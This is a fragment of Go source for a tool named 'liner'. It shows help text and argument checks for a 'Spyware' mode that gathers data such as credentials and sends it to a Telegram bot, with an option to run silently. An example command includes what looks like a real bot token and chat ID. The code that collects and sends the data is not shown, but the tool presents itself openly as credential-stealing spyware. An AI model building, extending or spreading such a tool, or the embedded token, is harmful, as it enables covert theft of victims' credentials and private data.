...
func printShortHelp() {
	fmt.Printf("%sUsage: liner --mode <MODE> --dump <DUMP> --token <TOKEN> --id <ID> [options]%s\n\n", ColorWhite, ColorReset)
	...
	fmt.Printf("%s  --token       Telegram bot token%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  --id          Telegram chat ID%s\n\n", ColorWhite, ColorReset)
...
func printFullHelp() {
	...
	fmt.Printf("%s                         - Spyware: Collects and sends specified data to Telegram%s\n", ColorWhite, ColorReset)
	...
	fmt.Printf("%s  --token <TOKEN>        Telegram bot token for sending data%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  --id <ID>              Telegram chat ID for receiving data%s\n\n", ColorWhite, ColorReset)
	fmt.Printf("%sOptional flags:%s\n", ColorWhite, ColorReset)
	...
	fmt.Printf("%s    liner --mode Spyware --dump all --token 7456023166:AAEiB_YLmvjsFOk-7n_Tea5qTSxTxLpM3nQ --id 7706811633%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s  Run in silent mode:%s\n", ColorWhite, ColorReset)
	fmt.Printf("%s    liner --mode Spyware --dump Credentials --token <TOKEN> --id <ID> --silent%s\n", ColorWhite, ColorReset)
...
func main() {
	...
	if *mode == "" || *token == "" || *chatID == "" {
		fmt.Printf("%s[ERROR]%s --mode, --token, and --id are required%s\n",
			ColorRed, ColorWhite, ColorReset)
		printShortHelp()
		os.Exit(1)
	}
